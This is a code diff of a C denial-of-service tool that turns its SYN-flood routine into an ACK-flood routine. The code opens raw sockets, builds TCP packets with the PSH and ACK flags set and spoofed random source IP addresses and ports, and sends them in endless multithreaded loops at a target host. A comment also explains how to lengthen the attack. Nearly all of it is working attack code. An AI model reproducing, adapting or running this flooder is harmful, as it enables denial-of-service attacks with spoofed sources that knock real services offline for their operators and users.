@@ -1,15 +1,15 @@
-#include <stdio.h>  // for memset
-#include <string.h> // strlen
-#include <stdlib.h> // exit
-#include <errno.h>  // errno
-#include <stdarg.h> // va_list
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <stdarg.h>
 #include <pthread.h>
 
-#include <unistd.h> // close
+#include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/tcp.h>
 #include <netinet/ip.h>
-#include <arpa/inet.h> // inet_addr
+#include <arpa/inet.h>
 
 #include "../main.h"
 
@@ -21,7 +21,7 @@ extern char *randip(char **buff);
 extern int randport(void);
 extern unsigned short checksum(unsigned short *ptr, int hlen);
 
-static int _send_syn_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep)
+static int _send_ack_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep)
 {
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
     if (socket_fd < 0)
@@ -32,39 +32,21 @@ static int _send_syn_packet(const char *daddr, const int dport, const char *sadd
         * if errno == 24
         *   You shoud check max file number use 'ulimit -n' in linux
         *   And change the max file number use 'ulimit -n <setting number>'
+        *   Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time
         */
         error(strerror(errno));
     }
     char datagram[4096] = {'\0'}; // datagram to represent the packet
 
-    struct ip *iph = (struct ip *)datagram;
-    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
+    struct ip *iph = (struct ip *)datagram;                                // IP header
+    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip)); // TCP header
 
-    // for sendto user
+    /* for sendto user */
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dport);
     sin.sin_addr.s_addr = inet_addr(daddr);
 
-    /*
-     * fill in the IP header
-     * 0                                       31
-     * |----|----|------|--|-------------------|
-     * |ver |ihl | -tos | -|    tot_len        |
-     * |----|----|------|--|-------------------|
-     * |       id          |   frag_off       -|
-     * |---------|---------|-------------------|
-     * |   ttl   |protocol |    check          |
-     * |---------|---------|-------------------|
-     * |                saddr                  |
-     * |---------------------------------------|
-     * |                daddr                  |
-     * |---------------------------------------|
-     * |                                       |
-    -* |                options                |
-     * |                                       |
-     * |---------------------------------------|
-     */
     iph->ip_v = 4;
     iph->ip_hl = 5; // header length
     iph->ip_tos = 0;
@@ -80,28 +62,22 @@ static int _send_syn_packet(const char *daddr, const int dport, const char *sadd
 
     tcph->source = htons(sport);
     tcph->dest = htons(dport);
-    tcph->seq = htons(randport()); // 32 bits but we just have 16 bits's value
-    tcph->ack_seq = 0;
-    tcph->doff = 5; // tcp header length is 20 Bytes
+    tcph->seq = 0;
+    tcph->ack_seq = htons(randport());
+    tcph->doff = 5;
     tcph->fin = 0;
-    tcph->syn = 1;
+    tcph->syn = 0;
     tcph->rst = 0;
-    tcph->psh = 0;
-    tcph->ack = 0;
+    tcph->psh = 1; // magic
+    tcph->ack = 1; // magic
     tcph->urg = 0;
     tcph->window = htons(65535); // maximum allowed window size
-    tcph->check = 0;             // set to 0 before calculating checksum
+    tcph->check = 0;
+    /*
+     * if you set a checksum to zero, your kernel's IP stack
+     * should fill in the correct checksum during transmission.
+     */
     tcph->urg_ptr = 0;
-
-    struct pseudo_header_tcp *psh = (struct pseudo_header_tcp *)malloc(sizeof(struct pseudo_header_tcp));
-    psh->source_address = inet_addr(saddr);
-	psh->dest_address = sin.sin_addr.s_addr;
-	psh->placeholder = 0;
-	psh->protocol = IPPROTO_TCP;
-	psh->tcp_length = htons(20);
-    memcpy(&psh->tcph, tcph, sizeof(struct tcphdr));
-    tcph->check = checksum((unsigned short *)psh, sizeof(struct pseudo_header_tcp));
-    free(psh);
 
     // IP_HDRINCL to tell the kernel that headers are included in the packet
     int one = 1;
@@ -130,13 +106,12 @@ static int _send_syn_packet(const char *daddr, const int dport, const char *sadd
     return 0;
 }
 
-static void _attack_thread(pSFTP parameters)
+static void _attack_thread(pAFTP parameters)
 {
     char *daddr = parameters->daddr;
     int dport = parameters->dport;
     int rep = parameters->rep;
 
-    // printf("thread say hi\n"); // debug use
     if (parameters->random_saddr)
     {
         char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
@@ -145,7 +120,7 @@ static void _attack_thread(pSFTP parameters)
         {
             saddr = randip(&saddr);
             sport = randport();
-            _send_syn_packet(daddr, dport, saddr, sport, rep);
+            _send_ack_packet(daddr, dport, saddr, sport, rep);
         }
         free(saddr);
     }
@@ -155,12 +130,12 @@ static void _attack_thread(pSFTP parameters)
         int sport = parameters->sport;
         while (1)
         {
-            _send_syn_packet(daddr, dport, saddr, sport, rep);
+            _send_ack_packet(daddr, dport, saddr, sport, rep);
         }
     }
 }
 
-int syn_flood_attack(char *url, int port, ...)
+int ack_flood_attack(char *url, int port, ...)
 {
     /*
      * this program must run as root
@@ -172,7 +147,6 @@ int syn_flood_attack(char *url, int port, ...)
      * 3 - random source address repetition time (int)
      * 4 - thread number (int)
      * 5 - source ip address (char *)
-     * 6 - source port (int)
      */
 
     int slist[4] = {'\0'};
@@ -191,7 +165,7 @@ int syn_flood_attack(char *url, int port, ...)
     int sport = va_arg(vlist, int);
     va_end(vlist);
 
-    pSFTP parameters = (pSFTP)malloc(sizeof(SFTP));
+    pAFTP parameters = (pAFTP)malloc(sizeof(AFTP));
     parameters->daddr = url;
     parameters->dport = port;
     parameters->random_saddr = random_saddr;
@@ -207,7 +181,7 @@ int syn_flood_attack(char *url, int port, ...)
     {
         if (strstr(url, "http"))
         {
-            error("syn flood attack target's address should not include 'http' or 'https'");
+            error("ack flood attack target's address should not include 'http' or 'https'");
         }
     }
     if (port == 0)
